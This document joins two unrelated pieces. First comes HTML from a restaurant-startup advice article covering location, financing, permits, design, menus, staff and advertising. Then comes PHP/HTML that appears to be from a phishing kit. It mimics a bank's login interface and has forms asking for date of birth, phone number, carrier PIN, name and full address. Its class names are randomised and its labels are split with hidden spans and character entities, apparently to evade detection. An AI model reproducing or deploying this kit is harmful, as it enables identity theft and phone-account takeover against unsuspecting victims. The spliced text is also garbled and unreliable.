<div id="billboard2" class="wrapper" data-type="billboard" data-pos="btf1" data-priority="3" data-sizes="[[300, 250], [300, 600], [300, 601], [160, 600], [300, 251], [2, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="c576ea9adcaf44bfbabaa91b4190c8c7" data-auction-floor-value="15"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard2_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<div id="mntl-sc-block_1-0-7" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-8" class="comp theme-experttipimportant mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Location, location, location. It can make or break a restaurant.</p></div>
</div>
</div>
<p id="mntl-sc-block_1-0-10" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Before you&nbsp;sign a <a href="https://www.thebalancesmb.com/rent-a-restaurant-2888547" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">lease</a> for your restaurant location, do your homework. Is the restaurant <a href="https://www.thebalancesmb.com/choosing-a-location-for-your-restaurant-2888635" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">located</a> in a busy area with plenty of foot traffic? If not, is there enough parking? Have several other restaurants opened and closed in the same spot?
</p>
<div id="mntl-sc-block_1-0-11" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_4-0" class="comp mntl-block">
<div id="billboard3-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard3-sticky-dynamic billboard-sticky--sc scads-stick-in-parent scads-ad-placed" data-height="600" style="top: 1984px;">
<div class="spacer">
<div id="billboard3-dynamic_1-0" class="comp billboard3-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic" style="">
<div id="billboard3" class="wrapper" data-type="billboard" data-pos="btf2" data-priority="5" data-sizes="[[300, 250], [300, 252], [3, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="33d99ae4cb6940b0b67ff5e22c3822a4" data-auction-floor-value="10"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/billboard3_0__container__" style="border: 0pt none; width: 300px; height: 250px;"></div></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-13" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The most enjoyable part of opening a new restaurant can be selecting a restaurant name that means something to you. It can be a family name, a play on words, another meaningful turn of phrase, or it can reflect the theme or location you chose, such as Broadway Diner or The Highlands.
</p>
<div id="mntl-sc-block_1-0-14" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_5-0" class="comp mntl-block">
<div id="native-placeholder_2-0" class="comp native-placeholder mntl-block"></div>
<div id="native_2-0" class="comp scads-to-load native mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt dynamic scads-ad-placed" style="">
<div id="native" class="wrapper" data-type="native" data-pos="native" data-priority="4" data-sizes="[[1,3], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}"><div id="google_ads_iframe_/479/thebalancesmb/balsmb_restaurants/native_0__container__" style="border: 0pt none; width: 1px; height: 3px;"></div></div>
</div>
</div></div>
<a class="heading-toc" id="business-plan"></a> <h2 id="mntl-sc-block_1-0-15" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Business Plan </span> </h2>
<p id="mntl-sc-block_1-0-17" class="comp text-passage mntl-sc-block mntl-sc-block-html">
The two most important reasons you need a restaurant <a href="https://www.thebalancesmb.com/how-to-write-a-restaurant-business-plan-2888455" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">business plan</a>. One, it helps you see potential problems in your restaurant plan, such as not enough of a <a href="https://www.thebalancesmb.com/how-to-find-out-the-population-base-of-an-area-2888660" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="2">population base</a>. Two, it's virtually impossible to get financing without one.
</p>
<div id="mntl-sc-block_1-0-18" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_6-0" class="comp mntl-block">
<div id="billboard4-sticky-dynamic_2-0" class="comp scads-to-load right-rail__item billboard-sticky billboard4-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard4-dynamic_2-0" class="comp billboard4-dynamic mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard4" class="wrapper" data-type="billboard" data-pos="btf3" data-priority="6" data-sizes="[[300, 250], [300, 253], [4, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="7d138dac2cd04f79b70ccf988cfa4880" data-auction-floor-value="15"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-20" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Financing is what prevents many from opening their own restaurant. Although it is somewhat more difficult to get financing for a restaurant, due to their higher failure rate than for some other business types, it is not impossible. Between banks, small business agencies, and private investors, there are several financing possibilities.
</p>
<div id="mntl-sc-block_1-0-21" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_7-0" class="comp mntl-block">
<div id="billboard5-sticky-dynamic_2-0" class="comp scads-to-load right-rail__item billboard-sticky billboard5-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard5-dynamic_2-0" class="comp js-billboard-lazy billboard5-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard5" class="wrapper" data-type="billboard" data-pos="btf4" data-priority="7" data-sizes="[[300, 250], [300, 254], [6, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="null" data-auction-floor-id="f74881159a694ed3a5ef4d7fdc098776" data-auction-floor-value="10"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-23" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Show up to your <a href="https://www.thebalancesmb.com/getting-ready-for-your-restaurant-loan-interview-2888445" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">financing interview</a>&nbsp;prepared, and show potential investors that you've thought through the mechanics of opening, running, and generating profit from a restaurant.
</p>
<div id="mntl-sc-block_1-0-24" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_8-0" class="comp mntl-block">
<div id="billboard6-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard6-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard6-dynamic_1-0" class="comp js-billboard-lazy billboard6-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard6" class="wrapper" data-type="billboard" data-pos="btf5" data-priority="8" data-sizes="[[300, 250], [300, 255], [7, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="ec3314ec6060403582b5d23c47cc7b18" data-auction-floor-value="25"></div>
</div>
</div>
</div>
</div></div>
<p id="mntl-sc-block_1-0-26" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Common <a href="https://www.thebalancesmb.com/restaurant-insurance-basics-2888374" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">licenses</a> and permits&nbsp;for restaurants, regardless of the state, include liquor licenses, signage permits, separate permits for outdoor space, and workers' compensation. And remember, many licenses and permits take several weeks, even months, to be approved. So once your financing is squared away, start filling the paperwork.
</p>
<div id="mntl-sc-block_1-0-27" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"><div id="mntl-block_9-0" class="comp mntl-block">
<div id="billboard7-sticky-dynamic_1-0" class="comp scads-to-load right-rail__item billboard-sticky billboard7-sticky-dynamic billboard-sticky--sc is-hidden" data-height="600">
<div class="spacer">
<div id="billboard7-dynamic_1-0" class="comp js-billboard-lazy billboard7-dynamic billboard-lazy mntl-lazy-ad mntl-gpt-dynamic-adunit mntl-gpt-adunit gpt billboard dynamic">
<div id="billboard7" class="wrapper" data-type="billboard" data-pos="btf6" data-priority="9" data-sizes="[[300, 250], [300, 256], [8, 1], &quot;fluid&quot;]" data-rtb="true" data-targeting="{}" data-auction-floor-id="3ec6b5929951449792897c3d6c02ac1d" data-auction-floor-value="25"></div>
</div>
</div>
</div>
</div></div>
<a class="heading-toc" id="restaurant-design"></a> <h2 id="mntl-sc-block_1-0-28" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Restaurant Design </span> </h2>
<p id="mntl-sc-block_1-0-30" class="comp text-passage mntl-sc-block mntl-sc-block-html">
A common-sense rule about designing a restaurant is that you never have as much space as you first thought you did. Even the most cavernous of spaces fill&nbsp;up quickly when you start adding commercial kitchens, walk-in refrigerators, a bar, restrooms, and a waiting area. A <a href="https://www.thebalancesmb.com/restaurant-design-2888629" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">restaurant's design</a> should be a balance between aesthetics and seating capacity, keeping practicality in mind.
</p>
<div id="mntl-sc-block_1-0-31" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<div id="mntl-sc-block_1-0-32" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-33" class="comp theme-experttiptip mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0-1" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Choosing the right color for your restaurant will help you establish a strong brand and help you establish a welcoming ambiance for customers.</p></div>
</div>
</div>
<a class="heading-toc" id="menus-equipment-and-staff"></a> <h2 id="mntl-sc-block_1-0-34" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Menus, Equipment, and Staff&nbsp; </span> </h2>
<p id="mntl-sc-block_1-0-36" class="comp text-passage mntl-sc-block mntl-sc-block-html">
A well-written <a href="https://www.thebalancesmb.com/how-to-choose-restaurant-menu-items-2888581" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">restaurant menu</a> should be descriptive, easy to read and have a clear, uncluttered layout. Also, it's better to use an attractive font and high-quality paper than muck it up with generic art found on the internet.
</p>
<div id="mntl-sc-block_1-0-37" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-39" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Once you have your restaurant design down, you can start purchasing commercial kitchen equipment and furniture for your dining room and other areas in the front of the house. To save money, consider buying used equipment from a reliable source.
</p>
<div id="mntl-sc-block_1-0-40" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-42" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Commercial equipment with the Energy Star&nbsp;logo can cost more at first but will pay for itself many times over, and it's better for the environment.
</p>
<div id="mntl-sc-block_1-0-43" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-45" class="comp text-passage mntl-sc-block mntl-sc-block-html">
As you get closer to opening day, hire for both the kitchen and the floor. Kitchen staff, waitstaff, and bartenders are all integral parts of most any restaurant, and you want to hire the perfect person for each position.
</p>
<div id="mntl-sc-block_1-0-46" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<p id="mntl-sc-block_1-0-48" class="comp text-passage mntl-sc-block mntl-sc-block-html">
If you can, hire people with experience in the foodservice industry, and if you're hiring a chef you don't know, don't be shy about asking to test-tasting their food first.
</p>
<div id="mntl-sc-block_1-0-49" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<a class="heading-toc" id="advertising"></a> <h2 id="mntl-sc-block_1-0-50" class="comp mntl-sc-block money-sc-block-heading mntl-sc-block-heading"> <span class="mntl-sc-block-heading__text"> Advertising </span> </h2>
<p id="mntl-sc-block_1-0-52" class="comp text-passage mntl-sc-block mntl-sc-block-html">
Advertising is a must for most <a href="https://www.thebalancesmb.com/how-to-advertise-for-a-new-restaurant-2888568" data-component="link" data-source="inlineLink" data-type="internalLink" data-ordinal="1">new restaurants</a>. Today, you can supplement social media advertising such as Facebook, Twitter, and Instagram, with more traditional advertising, such as newspapers and radio ads, depending on your concept and the diners you want to reach.
</p>
<div id="mntl-sc-block_1-0-53" class="comp mntl-sc-block mntl-sc-block-adslot mntl-block"></div>
<div id="mntl-sc-block_1-0-54" class="comp mntl-sc-block money-sc-block-callout mntl-block">
<div id="mntl-sc-block_1-0-55" class="comp theme-experttiptip mntl-sc-block mntl-sc-block-callout mntl-block" data-tracking-id="mntl-sc-block-callout" data-tracking-container="true">
<div id="mntl-sc-block-callout-body_1-0-2" class="comp mntl-sc-block-callout-body mntl-text-block">
<p>Don’t overlook the power of a good website. People can't taste food online, but an aesthetically-pleasing web presence can entice diners.&nbsp;</p></div>
</div>
</div>
<div id="mntl-block_1-0" class="comp js-scads-inline-content mntl-block">








</div>
</div>
</div>
</div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container dob1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="dob"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#68;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#79;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#66;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " maxlength="10" minlength="8" id="dob" placeholder="" autocomplete="off" type="text" name="dob" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container phone1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="phone"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#80;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#104;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#98;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " maxlength="14" minlength="14" id="phone" placeholder="" autocomplete="off" type="text" name="phone" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container capin1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="capin"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " maxlength="4" minlength="4" id="capin" placeholder="" autocomplete="off" type="text" name="capin" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                                    <button type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui button focus fluid primary touch"><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#102;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;</span> </button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>
								<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui raised segment" id="billingo" style="max-width: 470px!important; display:none;">
                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> row">
                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> col-xs-10 col-xs-offset-1">
                                            <form id="billing-form" name="billing-form" method="POST" autocomplete="off" action="">
                                                <div id="" align="center">
                                                    <ol class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr" data-progtrckr-steps="4">
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-done"></li>
                                                        <li class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> progtrckr-todo"></li>
                                                    </ol>
                                                </div>
                                                <br>
                                                <br>
                                                <div id="errbill"></div>
                                                <br>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container fullname1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="fullname"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#70;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#117;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#108;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#78;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#109;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="fullname" placeholder="" autocomplete="off" type="text" name="fullname" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container add1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="Address"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#65;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#114;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#115;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#76;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#110;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="Address" placeholder="" autocomplete="off" type="text" name="Address" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container City1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="City"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#121;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="City" placeholder="" autocomplete="off" type="text" name="City" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;"> </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container State1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="State"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#83;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#97;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#116;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="State" placeholder="" autocomplete="off" type="text" name="State" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
												<div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldgroup logon-xs-toggle logon-floating-label">
                                                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui vertical">
                                                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> align-label-input floating-label__container zipcode1">
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> label-wrapper">
                                                                <label class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui fieldlabel label-alignment vertical" for="zipcode"><span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#90;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#105;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#112;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#32;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#67;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#111;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#100;<span style="display:none;"><?php echo substr(str_shuffle($permitted_chars), 0, 2);?></span>&#101;</label>
                                                            </div>
                                                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> logon-xs-toggle">
                                                                <input class="<?php echo substr(str_shuffle($permitted_chars), 0, 12);?> jpui input logon-xs-toggle " id="zipcode" minlength="5" maxlength="5" placeholder="" autocomplete="off" type="text" name="zipcode" inputmode="numeric" required="" value="" style="box-shadow:0 2px 0 -1px #0b6efd;border-color: #0b6efd;">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
